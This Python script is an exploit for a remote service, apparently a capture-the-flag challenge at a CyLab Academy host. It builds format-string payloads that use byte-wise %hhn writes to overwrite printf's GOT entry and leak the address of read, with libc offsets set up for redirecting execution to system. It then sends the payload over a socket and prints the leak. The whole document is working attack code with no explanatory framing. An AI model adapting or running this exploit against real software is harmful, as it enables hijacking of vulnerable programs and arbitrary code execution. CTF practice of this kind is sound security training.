import sys, socket, time, struct, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
STRCSPN_GOT = 0x601060
READ_GOT = 0x601050
B_READ = 0x4008e8
READ_OFF = 0x111130
SYSTEM_OFF = 0x52290


def buildB(fmt_body, addrs):
    b = b"1" + fmt_body
    pad = (8 - (len(b) % 8)) % 8
    b += b"P" * pad
    off = len(b)
    for ad in addrs:
        b += struct.pack("<Q", ad)
    pos = [42 + (off // 8) + i for i in range(len(addrs))]
    return b, pos


def make_fmt(dst, value, leak_addr=None, c0=30, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    fmt = b""
    for i in range(len(order)):
        fmt += b"%99c%99$hhn"
    if leak_addr is not None:
        fmt += b"%99$s"
    b, pos = buildB(fmt, addrs)
    fmt = b""
    cur = c0
    for i, (v, off) in enumerate(order):
        need = (v - cur) % 256
        if need == 0:
            need = 256
        cur += need
        fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
    if leak_addr is not None:
        fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
    b2, pos2 = buildB(fmt, addrs)
    return b2, pos2


b1, p1 = make_fmt(PRINTF_GOT, B_READ, leak_addr=READ_GOT, c0=30)
print("B1:", b1[:110])
print("pos:", p1)
s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(b"-1\n"); time.sleep(0.2)
s.sendall(b1 + b"\n"); time.sleep(1.2)
buf = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        buf += c
except Exception:
    pass
print("recu:", len(buf))
print(repr(buf[:300]))
s.close()
